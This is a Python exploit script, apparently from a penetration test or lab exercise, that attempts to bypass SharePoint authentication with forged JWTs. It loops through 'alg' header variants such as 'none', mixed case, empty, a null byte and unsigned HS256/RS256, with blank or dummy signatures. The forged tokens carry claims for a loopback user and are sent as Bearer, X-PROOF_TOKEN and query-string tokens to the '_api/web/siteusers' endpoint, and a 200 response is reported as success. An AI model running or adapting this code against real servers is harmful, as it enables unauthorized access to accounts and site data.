# Purpose: Test JWT algorithm variations for auth bypass
# Outcome: Check if v2 SharePoint has algorithm validation gaps

import base64
import json
import time
import requests

def b64url_encode(data):
    if isinstance(data, str):
        data = data.encode()
    return base64.urlsafe_b64encode(data).rstrip(b'=').decode()

target_base = "http://10.10.10.166"
client_id = "00000003-0000-0ff1-ce00-000000000000"
realm = "5637f856-255d-4039-b165-224f3371d1d4"  # From earlier test

# Algorithm variations to test
algo_variations = [
    "none",           # Original
    "None",           # Capitalized
    "NONE",           # All caps
    "nOnE",           # Mixed case
    "",               # Empty string
    "null",           # Null string
    "  none  ",       # With spaces
    "none\x00",       # With null byte
    "HS256",          # Common algo without signature
    "RS256",          # RSA algo without signature
    "noNe",           # More mixed case
]

now = int(time.time())
base_payload = {
    "aud": f"{client_id}@{realm}",
    "iss": client_id,
    "nbf": now - 300,
    "exp": now + 3600,
    "ver": "hashedprooftoken",
    "nameid": f"{client_id}@{realm}",
    "endpointurl": "qqlAJmTxpB9A67xSyZk+tmrrNmYClY/fqig7ceZNsSM=",
    "endpointurlLength": 1,
    "isloopback": True,
    "isuser": True
}

print("[*] Testing JWT algorithm variations...")
print(f"[*] Target: {target_base}")
print(f"[*] Realm: {realm}")

for alg in algo_variations:
    header = {"alg": alg, "typ": "JWT"}
    payload = base_payload.copy()
    
    header_b64 = b64url_encode(json.dumps(header))
    payload_b64 = b64url_encode(json.dumps(payload))
    
    # Test with different signature parts
    for sig in ["", "AAA", "."]:
        jwt_token = f"{header_b64}.{payload_b64}.{sig}"
        
        headers = {
            "Authorization": f"Bearer {jwt_token}",
            "X-PROOF_TOKEN": jwt_token,
            "Accept": "application/json;odata=verbose"
        }
        
        try:
            r = requests.get(f"{target_base}/_api/web/siteusers", headers=headers, timeout=10, verify=False)
            status = r.status_code
            resp_preview = r.text[:100] if r.text else ""
            
            # Success indicator
            if status == 200:
                print(f"[SUCCESS] alg='{alg}' sig='{sig}': {status} - {resp_preview}")
            elif status != 401:
                print(f"[INTERESTING] alg='{alg}' sig='{sig}': {status} - {resp_preview}")
            else:
                # Only print first failure for each algo
                if sig == "":
                    print(f"    alg='{alg[:20]}': 401 - {resp_preview[:50]}")
        except Exception as e:
            print(f"    alg='{alg}' sig='{sig}': Error - {str(e)[:50]}")

# Test without typ field
print("\n[*] Testing without 'typ' field...")
header_no_typ = {"alg": "none"}
header_b64 = b64url_encode(json.dumps(header_no_typ))
payload_b64 = b64url_encode(json.dumps(base_payload))
jwt_token = f"{header_b64}.{payload_b64}.AAA"

headers = {
    "Authorization": f"Bearer {jwt_token}",
    "X-PROOF_TOKEN": jwt_token,
    "Accept": "application/json"
}
r = requests.get(f"{target_base}/_api/web/siteusers", headers=headers, timeout=10, verify=False)
print(f"    No typ field: {r.status_code} - {r.text[:80]}")

# Test with different token formats
print("\n[*] Testing alternative token formats...")

# Test with just access_token query param
r = requests.get(f"{target_base}/_api/web/siteusers?access_token={jwt_token}", timeout=10, verify=False)
print(f"    Query param access_token: {r.status_code}")

# Test with prooftoken query param
r = requests.get(f"{target_base}/_api/web/siteusers?access_token={jwt_token}&prooftoken={jwt_token}", timeout=10, verify=False)
print(f"    Query params both: {r.status_code}")

print("\n[*] Algorithm variation test complete")
